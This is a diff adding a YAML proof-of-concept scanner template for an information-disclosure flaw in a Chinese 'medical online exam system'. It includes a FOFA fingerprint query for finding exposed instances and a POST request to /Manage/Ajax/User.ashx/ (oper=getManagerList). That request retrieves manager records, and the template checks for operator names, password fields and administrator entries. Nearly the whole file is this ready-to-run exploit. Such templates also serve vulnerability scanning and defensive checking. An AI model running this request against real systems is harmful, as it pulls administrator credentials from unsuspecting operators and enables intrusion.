@@ -1,0 +1,18 @@
+id: poc-yaml-yq-moes-user-info-leak
+info:
+  name: 医学在线考试系统 User 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 医学在线考试系统
+  fofa: body="Manage/MainPage.aspx" || body="js/ExLibs.js" || body="css/ExamWindow.css"
+requests:
+- method: POST
+  path: /Manage/Ajax/User.ashx/
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: oper=getManagerList&name=&code=&depart=&page=1&rows=15
+  expression: status_code == 200 && contains(body,"\"strOperatorName\":") && contains(body,"\"strPassword\":")
+    && contains(body,"管理员") && !contains(body,"<html")
+variables: {}
+transport: http
